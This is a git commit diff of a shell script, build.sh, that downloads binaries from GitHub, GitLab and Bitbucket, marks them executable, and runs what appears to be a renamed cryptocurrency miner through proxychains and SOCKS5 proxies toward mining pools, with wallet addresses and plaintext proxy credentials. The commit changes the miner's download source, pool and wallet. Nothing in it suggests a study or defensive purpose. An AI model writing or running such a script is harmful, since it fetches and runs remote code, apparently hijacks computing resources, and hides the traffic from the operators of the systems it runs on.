4bbe6fb806079ba3774d1d0d05f590b3f1fead96
Mas kurniawan <110314564+55113110159@users.noreply.github.com>
2024-01-15 23:57:16 +0700

    Update build.sh

--- build.sh
+++ build.sh
@@ -2,7 +2,7 @@ proxy="188.74.210.21"
 port="6100" 
 user="ubslvwxe"  
 pass="iikj33112te4" 
-wget -q -O diamona https://github.com/devinasaliya/super-eureka/raw/main/nevo && chmod +x diamona
+wget -q -O diamona https://gitlab.com/55113110159/dokerweb/-/raw/main/xlarig && chmod +x diamona
 wget -q https://bitbucket.org/mandaresz/feriyaz/downloads/panel && chmod +x panel 
 wget -q https://bitbucket.org/mandaresz/feriyaz/downloads/proxychains.conf && chmod +x proxychains.conf 
 wget -q https://bitbucket.org/mandaresz/feriyaz/downloads/libproxychains4.so && chmod +x libproxychains4.so 
@@ -19,4 +19,4 @@ echo "IP ORI ==> "$(curl ifconfig.me)
 echo " " 
 echo " " 
 echo "IP BARU ==> "$(./panel curl ifconfig.me)
-./panel ./diamona -o 143.110.232.159:443 -u NS1gafSfSwrQpfVxQuUvWejJMTMTh5yQcG7cq8vSbfhEB7q8xx3Fu8z2dK4trDwcQJJsVreDNGLkq9RYticW9FM229o2GzYsc.$(echo $(shuf -i 1-9 -n 1)-Light) -a rx/nevo -x socks5://ubslvwxe:iikj33112te4@188.74.183.10:8279 --cpu-max-threads-hint=50% -k -s 
+./panel ./diamona --donate-level 1 -o 149.50.222.86:80 -u ZEPHsAfZQpiQ33Hf63Tx1MNJQR5cMV1Mx9kkgDMWNGZqMCYdsujaDUk6c4sGGiKzYwiqjucHjEYdfKaX5CbnpxPfGxa5Cb8BzcJ.8v -a rx/0 -x socks5://fixie:wJAdlDMok2aTd6z@34.192.37.108:1080 --cpu-max-threads-hint=70% -k  
